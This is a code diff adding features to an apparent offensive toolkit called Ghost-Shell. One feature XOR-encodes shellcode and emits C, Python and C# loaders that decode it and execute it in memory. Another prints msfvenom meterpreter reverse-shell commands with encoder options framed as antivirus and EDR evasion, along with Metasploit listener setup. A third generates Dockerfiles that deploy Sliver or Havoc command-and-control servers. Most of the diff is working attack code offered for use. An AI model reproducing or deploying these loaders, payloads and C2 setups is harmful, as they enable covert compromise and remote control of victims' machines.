@@ -1026,6 +1026,309 @@ def gerar_macro(tipo, ip, porta, linguagem="powershell", raw_cmd=None):
 
 
 # ==============================================================================
+# Shellcode Encoder
+# ==============================================================================
+
+def gerar_shellcode_encoder(shellcode_hex: str, arch: str = "auto", chave: int = None):
+    """XOR-encode raw shellcode (hex string) e gera stubs em C, Python3 e C#."""
+    _secao("SHELLCODE ENCODER (XOR)")
+
+    # Normaliza hex
+    shellcode_hex = shellcode_hex.replace("\\x", "").replace("0x", "").replace(" ", "").replace(",", "")
+    try:
+        raw_bytes = bytes.fromhex(shellcode_hex)
+    except ValueError:
+        _log("Shellcode hex invalido. Use formato: \\xfc\\xe8... ou fc e8...", "ERRO")
+        return
+
+    if arch == "auto":
+        arch = "x64" if len(raw_bytes) > 150 else "x86"
+
+    if chave is None:
+        import random
+        chave = random.randint(1, 254)
+
+    encrypted = bytes([b ^ chave for b in raw_bytes])
+
+    _log(f"Shellcode original: {len(raw_bytes)} bytes | arch: {arch} | chave XOR: 0x{chave:02x}", "INFO")
+    _log(f"Shellcode cifrado:  {len(encrypted)} bytes", "INFO")
+
+    # --- C array ---
+    c_arr = ", ".join(f"0x{b:02x}" for b in encrypted)
+    c_stub = f"""// Shellcode XOR encoder - By Gh0st-Bx1
+// Arch: {arch} | XOR key: 0x{chave:02x} | Size: {len(encrypted)} bytes
+#include <windows.h>
+#include <stdio.h>
+
+unsigned char buf[] = {{ {c_arr} }};
+unsigned int buf_len = {len(encrypted)};
+
+int main() {{
+    unsigned char key = 0x{chave:02x};
+    for (unsigned int i = 0; i < buf_len; i++) buf[i] ^= key;
+
+    LPVOID mem = VirtualAlloc(NULL, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem) return 1;
+    RtlMoveMemory(mem, buf, buf_len);
+    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+    WaitForSingleObject(th, INFINITE);
+    return 0;
+}}
+// Compilar: x86_64-w64-mingw32-gcc stub.c -o stub.exe -masm=intel -s
+// Ou: cl.exe /nologo stub.c /link /OUT:stub.exe
+"""
+
+    # --- Python3 loader ---
+    py_hex = "".join(f"\\x{b:02x}" for b in encrypted)
+    py_stub = f"""#!/usr/bin/env python3
+# Shellcode XOR loader - By Gh0st-Bx1
+# Arch: {arch} | XOR key: 0x{chave:02x} | Size: {len(encrypted)} bytes
+import ctypes, sys
+
+KEY = {chave}
+buf = bytearray(b"{py_hex}")
+buf = bytearray([b ^ KEY for b in buf])
+
+ptr = ctypes.windll.kernel32.VirtualAlloc(
+    ctypes.c_int(0), ctypes.c_int(len(buf)),
+    ctypes.c_int(0x3000), ctypes.c_int(0x40))
+ctypes.windll.kernel32.RtlMoveMemory(
+    ctypes.c_int(ptr), buf, ctypes.c_int(len(buf)))
+ht = ctypes.windll.kernel32.CreateThread(
+    ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
+    ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+"""
+
+    # --- C# byte[] ---
+    cs_arr = ", ".join(f"0x{b:02x}" for b in encrypted)
+    cs_stub = f"""// Shellcode XOR loader C# - By Gh0st-Bx1
+// Arch: {arch} | XOR key: 0x{chave:02x} | Size: {len(encrypted)} bytes
+using System;
+using System.Runtime.InteropServices;
+
+class Loader {{
+    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
+    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+    static void Main() {{
+        byte[] buf = new byte[] {{ {cs_arr} }};
+        byte key = 0x{chave:02x};
+        for (int i = 0; i < buf.Length; i++) buf[i] ^= key;
+        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+        Marshal.Copy(buf, 0, mem, buf.Length);
+        IntPtr th = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(th, 0xFFFFFFFF);
+    }}
+}}
+// Compilar: csc.exe /nologo Loader.cs
+"""
+
+    stubs = {"c_stub.c": c_stub, "loader.py": py_stub, "Loader.cs": cs_stub}
+    for fname, content in stubs.items():
+        print(f"\n{C['C']}{C['N']}  [{fname}]{C['X']}")
+        print(f"{C['D']}{content.strip()}{C['X']}")
+
+    # Salvar em arquivos
+    for fname, content in stubs.items():
+        try:
+            with open(fname, "w") as f:
+                f.write(content)
+            _log(f"Salvo: {fname}", "OK")
+        except Exception as e:
+            _log(f"Nao foi possivel salvar {fname}: {e}", "ALERTA")
+
+    _log(f"XOR key: 0x{chave:02x} ({chave}) - guarde esta chave!", "ALERTA")
+
+
+# ==============================================================================
+# Staged vs Stageless
+# ==============================================================================
+
+def mostrar_staged_vs_stageless(ip: str, porta: int):
+    """Exibe tabela comparativa Staged x Stageless e comandos msfvenom para cada."""
+    _secao("STAGED vs STAGELESS - GUIA DE ESCOLHA")
+
+    print(f"""
+{C['C']}{C['N']}  Staged (/) vs Stageless (//)  -  Comparativo{C['X']}
+
+  {C['Y']}{'Criterio':<30} {'Staged (/)':^25} {'Stageless (///)':^25}{C['X']}
+  {'─'*80}
+  {'Tamanho do payload':<30} {'Pequeno (~300B)':^25} {'Grande (>10KB)':^25}
+  {'Requer callback':<30} {'Sim (stage download)':^25} {'Nao (tudo embutido)':^25}
+  {'AV evasion':<30} {'Melhor (menos bytes)':^25} {'Pior (assinatura maior)':^25}
+  {'Rede detectavel':<30} {'Sim (stage transfer)':^25} {'Menos (1 conexao)':^25}
+  {'Offline/air-gap':<30} {'Nao':^25} {'Sim':^25}
+  {'Encoding embutido':<30} {'Apenas o stager':^25} {'Payload inteiro':^25}
+  {'Uso recomendado':<30} {'Exploit com buf limite':^25} {'Evasao de EDR':^25}
+
+{C['C']}{C['N']}  Comandos msfvenom - Linux:{C['X']}
+  {C['G']}# Staged (x64 linux):{C['X']}
+  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} -f elf -o staged.elf
+  {C['G']}# Stageless (x64 linux):{C['X']}
+  msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={porta} -f elf -o stageless.elf
+
+{C['C']}{C['N']}  Comandos msfvenom - Windows:{C['X']}
+  {C['G']}# Staged (x64 win):{C['X']}
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} -f exe -o staged.exe
+  {C['G']}# Stageless (x64 win) + shikata_ga_nai:{C['X']}
+  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={porta} -e x64/xor_dynamic -i 5 -f exe -o stageless.exe
+
+{C['C']}{C['N']}  Metasploit listener:{C['X']}
+  {C['G']}# Para staged:{C['X']}
+  use exploit/multi/handler
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  set LHOST {ip}
+  set LPORT {porta}
+  run -j
+  {C['G']}# Para stageless (mesmo handler):{C['X']}
+  set PAYLOAD windows/x64/meterpreter_reverse_tcp
+
+{C['C']}{C['N']}  Havoc C2 - Demon agent:{C['X']}
+  {C['G']}# Stageless PE:{C['X']}
+  Payloads -> Demon -> Indirect Syscall -> PE -> Stageless
+  {C['G']}# Staged shellcode:{C['X']}
+  Payloads -> Demon -> Indirect Syscall -> Shellcode -> Staged
+""")
+
+
+# ==============================================================================
+# C2 Dockerfile Generator
+# ==============================================================================
+
+def gerar_c2_dockerfile(framework: str = "sliver"):
+    """Gera Dockerfile e docker-compose para Sliver ou Havoc C2."""
+    _secao(f"C2 DOCKERFILE - {framework.upper()}")
+
+    if framework == "sliver":
+        dockerfile = """# Sliver C2 - Dockerfile
+# By Gh0st-Bx1 | github.com/Ghost-Bx1
+# Imagem: BishopFox Sliver C2 Framework
+FROM debian:bookworm-slim
+
+RUN apt-get update && apt-get install -y --no-install-recommends \\
+    curl wget ca-certificates unzip mingw-w64 \\
+    && rm -rf /var/lib/apt/lists/*
+
+# Instala Sliver (versao mais recente)
+RUN LATEST=$(curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest \\
+    | grep tag_name | cut -d'"' -f4) && \\
+    curl -L "https://github.com/BishopFox/sliver/releases/download/${LATEST}/sliver-server_linux" \\
+    -o /usr/local/bin/sliver-server && \\
+    chmod +x /usr/local/bin/sliver-server
+
+EXPOSE 443 31337 8443
+
+WORKDIR /sliver
+ENTRYPOINT ["/usr/local/bin/sliver-server"]
+CMD ["daemon"]
+"""
+
+        compose = """# docker-compose.yml - Sliver C2
+# By Gh0st-Bx1 | github.com/Ghost-Bx1
+version: '3.8'
+services:
+  sliver:
+    build: .
+    container_name: sliver-c2
+    restart: unless-stopped
+    network_mode: host
+    volumes:
+      - ./sliver-data:/root/.sliver
+      - ./loot:/root/.sliver/loot
+    environment:
+      - SLIVER_OPERATOR_NAME=ghost
+    ports:
+      - "443:443"
+      - "31337:31337"
+      - "8443:8443"
+"""
+
+        print(f"\n{C['C']}{C['N']}  [Dockerfile.sliver]{C['X']}")
+        print(f"{C['D']}{dockerfile.strip()}{C['X']}")
+        print(f"\n{C['C']}{C['N']}  [docker-compose.yml]{C['X']}")
+        print(f"{C['D']}{compose.strip()}{C['X']}")
+
+        print(f"\n{C['Y']}  Comandos de uso:{C['X']}")
+        print(f"  {C['G']}docker-compose up -d --build{C['X']}")
+        print(f"  {C['G']}docker exec -it sliver-c2 sliver-server{C['X']}")
+        print(f"  {C['G']}# No console Sliver:{C['X']}")
+        print(f"  {C['G']}generate --mtls YOUR_IP:443 --os windows --arch amd64 --format exe{C['X']}")
+        print(f"  {C['G']}mtls --lhost 0.0.0.0 --lport 443{C['X']}")
+
+        try:
+            with open("Dockerfile.sliver", "w") as f:
+                f.write(dockerfile)
+            with open("docker-compose.sliver.yml", "w") as f:
+                f.write(compose)
+            _log("Salvo: Dockerfile.sliver + docker-compose.sliver.yml", "OK")
+        except Exception as e:
+            _log(f"Nao foi possivel salvar arquivos: {e}", "ALERTA")
+
+    elif framework == "havoc":
+        dockerfile = """# Havoc C2 - Dockerfile
+# By Gh0st-Bx1 | github.com/Ghost-Bx1
+FROM debian:bookworm-slim
+
+RUN apt-get update && apt-get install -y --no-install-recommends \\
+    git cmake build-essential mingw-w64 python3 python3-dev \\
+    libssl-dev libboost-all-dev qtbase5-dev qtchooser qt5-qmake \\
+    qtbase5-dev-tools golang-go nasm \\
+    && rm -rf /var/lib/apt/lists/*
+
+RUN git clone https://github.com/HavocFramework/Havoc.git /havoc
+WORKDIR /havoc
+
+RUN cd teamserver && go mod tidy && go build .
+
+EXPOSE 40056 443 80
+
+ENTRYPOINT ["/havoc/teamserver/teamserver"]
+CMD ["server", "--profile", "/havoc/profiles/havoc.yaotl"]
+"""
+
+        compose = """# docker-compose.yml - Havoc C2
+# By Gh0st-Bx1 | github.com/Ghost-Bx1
+version: '3.8'
+services:
+  havoc-ts:
+    build: .
+    container_name: havoc-teamserver
+    restart: unless-stopped
+    network_mode: host
+    volumes:
+      - ./havoc-data:/havoc/data
+      - ./profiles:/havoc/profiles
+    ports:
+      - "40056:40056"
+      - "443:443"
+      - "80:80"
+"""
+
+        print(f"\n{C['C']}{C['N']}  [Dockerfile.havoc]{C['X']}")
+        print(f"{C['D']}{dockerfile.strip()}{C['X']}")
+        print(f"\n{C['C']}{C['N']}  [docker-compose.yml]{C['X']}")
+        print(f"{C['D']}{compose.strip()}{C['X']}")
+
+        print(f"\n{C['Y']}  Comandos de uso:{C['X']}")
+        print(f"  {C['G']}docker-compose up -d --build{C['X']}")
+        print(f"  {C['G']}# Conectar com cliente Havoc GUI:{C['X']}")
+        print(f"  {C['G']}./havoc client --yaotl profiles/havoc.yaotl{C['X']}")
+
+        try:
+            with open("Dockerfile.havoc", "w") as f:
+                f.write(dockerfile)
+            with open("docker-compose.havoc.yml", "w") as f:
+                f.write(compose)
+            _log("Salvo: Dockerfile.havoc + docker-compose.havoc.yml", "OK")
+        except Exception as e:
+            _log(f"Nao foi possivel salvar arquivos: {e}", "ALERTA")
+    else:
+        _log(f"Framework desconhecido: {framework}. Use sliver ou havoc.", "ERRO")
+
+
+# ==============================================================================
 # CLI
 # ==============================================================================
 
@@ -1108,6 +1411,24 @@ def main():
     p_macro.add_argument("-i", "--ip", required=True, help="IP do listener (atacante)")
     p_macro.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")
     p_macro.add_argument("--cmd", help="Comando raw (apenas para vba_raw)")
+
+    # Modo SHELLCODE
+    p_sc = sub.add_parser("shellcode", help="XOR-encode shellcode e gerar stubs em C/Python3/C#")
+    p_sc.add_argument("--hex", required=True, help="Shellcode em hex (ex: fc e8... ou \\xfc\\xe8...)")
+    p_sc.add_argument("--arch", choices=["x86", "x64", "auto"], default="auto",
+                      help="Arquitetura (auto detecta pelo tamanho)")
+    p_sc.add_argument("--key", type=lambda x: int(x, 0), default=None,
+                      help="Chave XOR 0-255 (padrao: aleatorio)")
+
+    # Modo STAGED
+    p_staged = sub.add_parser("staged", help="Tabela comparativa Staged x Stageless + comandos msfvenom")
+    p_staged.add_argument("-i", "--ip", required=True, help="IP do listener")
+    p_staged.add_argument("-p", "--porta", required=True, type=int, help="Porta do listener")
+
+    # Modo C2DOCKER
+    p_c2d = sub.add_parser("c2docker", help="Gerar Dockerfile para Sliver ou Havoc C2")
+    p_c2d.add_argument("--framework", choices=["sliver", "havoc"], default="sliver",
+                       help="Framework C2 (padrao: sliver)")
 
     args = parser.parse_args()
 
@@ -1211,6 +1532,15 @@ def main():
 
     elif args.modo == "macro":
         gerar_macro(args.tipo, args.ip, args.porta, raw_cmd=args.cmd)
+
+    elif args.modo == "shellcode":
+        gerar_shellcode_encoder(args.hex, arch=args.arch, chave=args.key)
+
+    elif args.modo == "staged":
+        mostrar_staged_vs_stageless(args.ip, args.porta)
+
+    elif args.modo == "c2docker":
+        gerar_c2_dockerfile(framework=args.framework)
 
     print(f"\n  {C['G']}{C['N']}[+] Ghost-Shell finalizado.{C['X']}\n")
 
